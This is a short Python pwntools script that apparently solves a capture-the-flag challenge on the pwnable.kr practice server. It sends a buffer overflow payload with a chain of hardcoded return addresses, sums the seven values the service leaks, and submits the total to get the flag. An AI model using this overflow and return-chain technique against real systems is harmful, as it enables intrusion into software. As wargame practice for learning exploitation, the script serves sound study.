from pwn import *
import struct

def connection():
    conn = remote('pwnable.kr', 9032)

    return conn

def GetLine(conn : remote, until = "", all = False):
    if all:
        line = conn.recvall().decode().replace("\n", "\n[+] ")
    elif len(until) != 0:
        line = conn.recvuntil(until, drop=True).decode().replace("\n", "\n[+] ")
    else:
        line = conn.recvline().decode()
    
    print("[+] " + line)

    return line

def SendLine(conn : remote, line):
    conn.send(line + "\n\r")

def CalcExp(line):
    return int(line[line.find("+") + 1:line.find(")")])


def main():
    exp : int = 0
    conn = connection()
    GetLine(conn, ":")
    SendLine(conn, ('a' * 121 + "\x4b\xfe\x09\x08" + "\x6a\xfe\x09\x08" + "\x89\xfe\x09\x08" + "\xa8\xfe\x09\x08" + "\xc7\xfe\x09\x08" + "\xe6\xfe\x09\x08" + "\x05\xff\x09\x08" + "\xfc\xff\x09\x08" + 'pqqqrrrssstttuuuvvvwwwxxxyyyzzz'))
    GetLine(conn)
    for _ in range(7):
        exp += CalcExp(GetLine(conn))
    print(exp)
    GetLine(conn, ":")
    SendLine(conn, str(exp))
    GetLine(conn, ":")
    SendLine(conn, str(exp))
    GetLine(conn, all = True)
    conn.close()

if __name__ == "__main__":
    main()